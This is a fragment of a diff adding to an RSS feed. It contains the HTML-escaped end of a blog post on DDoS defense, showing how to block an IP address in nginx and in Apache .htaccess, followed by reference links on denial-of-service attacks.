+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;(3) Web server&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Web can also used to intercept IP address &lt;code&gt;1.2.3.4&lt;/code&gt;, on nginx:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;location / {
+  deny 1.2.3.4;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On Apache, modify the  &lt;code&gt;.htaccess&lt;/code&gt; file:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;RequireAll&amp;gt;
+    Require all granted
+    Require not ip 1.2.3.4
+&amp;lt;/RequireAll&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Web server have a impact impact on the performance when used in firewall and cannot protect when there are huge DDoS attack.&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://www.ruanyifeng.com/blog/2018/06/ddos.html&#34;&gt;https://www.ruanyifeng.com/blog/2018/06/ddos.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/&#34;&gt;What is a distributed denial-of-service (DDoS) attack? | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/&#34;&gt;What is a distributed denial-of-service (DDoS) attack? | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Denial-of-service_attack&#34;&gt;Denial-of-service attack&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
